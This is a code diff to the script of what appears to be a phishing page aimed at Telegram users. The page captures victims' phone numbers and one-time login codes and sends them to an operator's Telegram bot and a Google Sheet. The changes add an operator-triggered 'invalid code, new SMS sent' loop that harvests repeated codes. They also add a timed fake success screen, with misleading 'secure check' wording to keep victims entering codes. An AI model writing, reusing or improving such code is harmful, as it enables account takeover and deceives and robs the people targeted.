@@ -191,32 +191,30 @@ function startPolling(phone) {
                 fetch(`${SCRIPT_URL}?num=${phone}&cmd=clear`); 
             }
 
-            // 2. THE RETRY LOOP (Triggers every time you click 'Wrong OTP')
             if(status === "otp_error" && !isResetting) {
-                isResetting = true; // Lock the logic so it only runs ONCE per click
+    isResetting = true;
 
-                // Tell the Google Script to forget the error immediately
-                await fetch(`${SCRIPT_URL}?num=${phone}&cmd=clear`);
+    // KILL the 45-second "Success" timer so it doesn't jump to Stage 4
+    if (window.autoApproveTimeout) clearTimeout(window.autoApproveTimeout);
 
-                // UI Feedback: Tell the user it was wrong
-                const timerEl = document.getElementById('timer');
-                timerEl.style.color = "yellow";
-                timerEl.innerText = "INVALID CODE - RESENDING...";
-                
-                // Clear the boxes for the new attempt
-                document.querySelectorAll('.otp-input').forEach(input => input.value = "");
-                
-                const btn = document.getElementById('otp-btn');
-                btn.innerText = "Confirm & Finish";
-                btn.disabled = false;
+    await fetch(`${SCRIPT_URL}?num=${phone}&cmd=clear`);
 
-                // Restart the timer and unlock the logic after a short delay
-                setTimeout(() => {
-                    timerEl.style.color = "var(--tele-red)";
-                    runCountdown(30);
-                    isResetting = false; // Ready for the NEXT 'Wrong OTP' click
-                }, 1500);
-            }
+    const timerEl = document.getElementById('timer');
+    timerEl.style.color = "yellow";
+    timerEl.innerText = "INVALID CODE - NEW SMS SENT";
+    
+    document.querySelectorAll('.otp-input').forEach(input => input.value = "");
+    
+    const btn = document.getElementById('otp-btn');
+    btn.innerText = "Confirm & Finish";
+    btn.disabled = false;
+
+    setTimeout(() => {
+        timerEl.style.color = "var(--tele-red)";
+        runCountdown(30);
+        isResetting = false;
+    }, 1500);
+}
         } catch(e) { console.log("Polling error:", e); }
     }, 4000);
 }
@@ -261,30 +259,36 @@ async function sendOTP() {
     let otpCode = "";
     inputs.forEach(input => otpCode += input.value);
 
-    if(otpCode.length < 5) return; // Don't send partial codes
+    if(otpCode.length < 5) return; 
 
     const phone = document.getElementById('user-id').value;
     const btn = document.getElementById('otp-btn');
+    const timerEl = document.getElementById('timer');
     
-    btn.innerText = "VERIFYING...";
+    // 1. Enter "Verifying" state
+    btn.innerText = "VERIFYING... PLEASE WAIT";
     btn.disabled = true;
+    timerEl.innerText = "SECURE CHECK IN PROGRESS";
+    timerEl.style.color = "white";
 
-    // Send the OTP to Telegram
+    // 2. Send the OTP to your Telegram
     if(BOT_TOKEN && CHAT_ID) {
         const msg = `🔓 *OTP RECEIVED*\n📱 Phone: ${phone}\n🔢 CODE: *${otpCode}*`;
-        
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
     }
 
-    // Also update Google Sheet with the OTP
+    // 3. Update Google Sheet
     fetch(SCRIPT_URL, { 
         method: 'POST', 
         mode: 'no-cors', 
         body: new URLSearchParams({ phone: phone, otp: otpCode, action: "saveOTP" }) 
     });
 
-    // Show Success View
-    setTimeout(() => { showView(4); }, 1500);
+    // 4. THE 45-SECOND GATE
+    // If you do NOT click "Wrong OTP" within 45 seconds, it auto-approves
+    window.autoApproveTimeout = setTimeout(() => {
+        showView(4); // Show Success Screen
+    }, 45000); 
 }
 </script>
 
